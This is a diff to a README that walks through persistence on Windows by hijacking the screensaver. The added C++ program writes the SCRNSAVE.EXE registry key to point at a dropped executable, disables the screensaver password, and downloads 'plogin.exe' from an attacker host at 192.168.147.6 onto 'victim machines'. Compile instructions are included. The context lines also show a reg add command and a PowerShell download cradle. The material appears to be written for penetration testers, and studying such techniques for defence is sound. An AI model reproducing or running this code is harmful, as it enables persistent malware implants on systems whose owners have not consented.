@@ -20,6 +20,9 @@ Brief description: A simple walkthrough on Windows Screensaver Hijacking for per
     - [Simple Demo](#simple-demo)
         - [ScreensaverHijack with command PWNED](#screensaverhijack-with-command-pwned)
         - [ScreensaverHijack with sliver implants](#screensaverhijack-with-sliver-implants)
+        - [Code with CPP for registry changer](#code-with-cpp-for-registry-changer)
+        - [Code with CPP for registry changer along with download malicious executable](#code-with-cpp-for-registry-changer-along-with-download-malicious-executable)
+            - [ScreensaverHijack using CPP for registry changer and download sliver implants](#screensaverhijack-using-cpp-for-registry-changer-and-download-sliver-implants)
     - [Additional Information](#additional-information)
 
 <!-- /TOC -->
@@ -95,6 +98,18 @@ reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /d C:\Windows\Temp\plogin.e
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.147.6/plogin.exe', 'C:\Windows\Temp\plogin.exe')"
 ```
 
+### ScreensaverHijack with command PWNED
+
+![ScreensaverHijack-with-command-PWNED](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking/blob/master/ScreensaverHijack-with-command-PWNED.gif)
+
+### ScreensaverHijack with sliver implants
+
+![ScreensaverHijack-with-sliver-implants](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking/blob/master/ScreensaverHijack-with-sliver-implants.gif)
+
+### Code with CPP for registry changer
+
+**Below code can be use in mingw32 or *nix environment**
+
 We may also use C++ and compile as screensaver register key changer executable using command below:
 
 ```bash
@@ -107,8 +122,6 @@ Sample of C++ code as below:
 #include <windows.h>
 #include <string.h>
 #include <iostream>
-#include <urlmon.h>
-#pragma comment(lib,"urlmon.lib")
 
 using namespace std;
 
@@ -154,23 +167,108 @@ int main(int argc, char* argv[]) {
     RegSetValueEx(hkey, (LPCSTR)"SCRNSAVE.EXE", 0, REG_SZ, (unsigned char*)placeholder, strlen(placeholder));
     RegCloseKey(hkey);
   }
-  
-  // Enable this if you need to download payload to the victim machines
-  // HRESULT hr = URLDownloadToFile(0, L"http://192.168.147.6/plogin.exe", L"C:\Windows\Temp\plogin.exe", 0, NULL);
-  // if (hr == S_OK){
-  //   cout << "ok" << endl;
-  // }
   return 0;
 }
 ```
 
-### ScreensaverHijack with command PWNED
+### Code with CPP for registry changer along with download malicious executable
 
-![ScreensaverHijack-with-command-PWNED](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking/blob/master/ScreensaverHijack-with-command-PWNED.gif)
+**Below code only compatible with Windows Visual Studio**
 
-### ScreensaverHijack with sliver implants
+```c++
+#include <winsock2.h>
+#include <windows.h>
+#include <stdlib.h>
+#include <iostream>
+#include <string>
 
-![ScreensaverHijack-with-sliver-implants](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking/blob/master/ScreensaverHijack-with-sliver-implants.gif)
+//To use urlmon and download to file 
+#include <Urlmon.h>
+#pragma comment(lib,"urlmon.lib")
+#pragma comment(lib, "Advapi32.lib")
+
+using namespace std;
+
+static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
+{
+    size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
+    return written;
+}
+
+int reg_key_compare(HKEY hKeyRoot, char *lpSubKey, char *regVal, char *compare)
+{
+    HKEY hKey = nullptr;
+    LONG ret;
+    char value[1024];
+    DWORD size = sizeof(value);
+    ret = RegOpenKeyExA(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);
+    if (ret == ERROR_SUCCESS)
+    {
+        RegQueryValueExA(hKey, regVal, NULL, NULL, (LPBYTE)value, &size);
+        if (ret == ERROR_SUCCESS)
+        {
+            if (strcmp(value, compare) == 0)
+            {
+                return TRUE;
+            }
+        }
+    }
+    return FALSE;
+}
+
+int main(int argc, char *argv[])
+{
+    HKEY hkey = NULL;
+
+    // Change this to point to YOUR EXE/Script
+    const char *placeholder = "C:\\Windows\\Temp\\plogin.exe";
+
+    // Change timeouts duration
+    const char *timeouts = "10";
+
+    // Enable screensavers
+    const char *enabled_screensavers = "1";
+
+    // Disabled password
+    const char *disabled_password = "0";
+
+    // startup
+    LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) "Control Panel\\Desktop", 0, KEY_WRITE, &hkey);
+    if (res == ERROR_SUCCESS)
+    {
+        // create new registry keys
+        RegSetValueEx(hkey, (LPCSTR) "ScreenSaveActive", 0, REG_SZ, (unsigned char *)enabled_screensavers, strlen(enabled_screensavers));
+        RegSetValueEx(hkey, (LPCSTR) "ScreenSaveTimeOut", 0, REG_SZ, (unsigned char *)timeouts, strlen(timeouts));
+        RegSetValueEx(hkey, (LPCSTR) "ScreenSaverIsSecure", 0, REG_SZ, (unsigned char *)disabled_password, strlen(disabled_password));
+        RegSetValueEx(hkey, (LPCSTR) "SCRNSAVE.EXE", 0, REG_SZ, (unsigned char *)placeholder, strlen(placeholder));
+        RegCloseKey(hkey);
+    }
+
+    // Enable this if you need to download payload to the victim machines
+    // Change this to suit your application
+    HRESULT hr = URLDownloadToFile(0, "http://192.168.147.6/plogin.exe", "C:\\Windows\\Temp\\plogin.exe", 0, NULL);
+    if (hr == S_OK) {
+        cout << "ok" << endl;
+    }
+    
+    return 0;
+}
+```
+
+**To compile**, use Visual Studio built compiler. Navigate to `C:\Program Files\Microsoft Visual Studio\2022\Community` or whatever version you installed, OR; simply open `Developer Command Prompt for VS 2022`.
+
+```dos
+<!-- Format as below: -->
+<!-- cl PATH-to-CPP-File /Fe:PATH-to-output-FILE -->
+
+cl scrnsave-reg-austin-v3.cpp /Fe:scrnsave-reg-austin-v3.exe
+```
+
+**You may use libcurl to download the file as well, however in the example here did not managed to compile due to linker error.**
+
+#### ScreensaverHijack using CPP for registry changer and download sliver implants
+
+![]()
 
 ## Additional Information
 
